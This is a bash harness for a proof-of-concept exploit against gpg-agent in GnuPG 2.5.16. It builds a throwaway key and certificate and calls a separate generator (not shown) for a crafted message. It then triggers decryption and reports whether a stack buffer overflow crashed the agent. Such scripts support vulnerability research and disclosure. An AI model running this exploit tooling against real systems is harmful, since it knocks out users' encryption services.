#!/bin/bash
set -e

echo "------------------------------------------------"
echo "[*] Setting up Environment for GnuPG 2.5.16 PoC"
echo "------------------------------------------------"

rngd -r /dev/urandom >/dev/null 2>&1 || true

# Config
mkdir -p ~/.gnupg
chmod 700 ~/.gnupg
echo "pinentry-program /usr/bin/pinentry-tty" > ~/.gnupg/gpg-agent.conf
echo "allow-loopback-pinentry" >> ~/.gnupg/gpg-agent.conf
echo "disable-dirmngr" > ~/.gnupg/gpgsm.conf
echo "disable-crl-checks" >> ~/.gnupg/gpgsm.conf

# Key Gen
echo "[*] Generating ECC P-256 Key/Cert..."
openssl ecparam -name prime256v1 -genkey -out private.key 2>/dev/null
openssl req -new -x509 -key private.key -out cert.pem -days 365 \
    -subj "/CN=TestUser" -set_serial 12345 2>/dev/null
openssl pkcs12 -export -inkey private.key -in cert.pem -out key.p12 \
    -passout pass: -name "TestUser"

# Import
echo "[*] Importing Key..."
gpgconf --kill gpg-agent 2>/dev/null || true
gpg-agent --daemon --allow-loopback-pinentry >/dev/null 2>&1
echo "" | gpgsm --import --pinentry-mode=loopback --passphrase-fd 0 key.p12 2>/dev/null

# Generate PoC
echo "[*] Generating Malicious Message..."
python3 poc_gen.py crash_agent.p7m cert.pem

# Restart Agent for Crash
echo "[*] Restarting gpg-agent in debug mode..."
gpgconf --kill gpg-agent 2>/dev/null || true
gpg-agent --daemon --debug-level expert --debug-all --log-file agent.log

# Trigger
echo "------------------------------------------------"
echo "[*] Triggering Decryption (Attempting Crash)..."
echo "------------------------------------------------"

set +e
gpgsm --debug-level expert --debug-all -d crash_agent.p7m > decrypted.txt 2> gpgsm_debug.log
set -e

# Verify
if pgrep gpg-agent > /dev/null; then
    echo "[-] gpg-agent is still running. The exploit FAILED."
    echo ""
    echo "=== AGENT LOG TAIL ==="
    tail -n 20 agent.log
    echo ""
    echo "=== GPGSM LOG TAIL ==="
    tail -n 20 gpgsm_debug.log
else
    echo "[+] gpg-agent is NOT running."
    echo "[+] SUCCESS: The stack buffer overflow crashed the agent."
    echo ""
    echo "=== AGENT LOG (Last moments before death) ==="
    tail -n 20 agent.log
fi
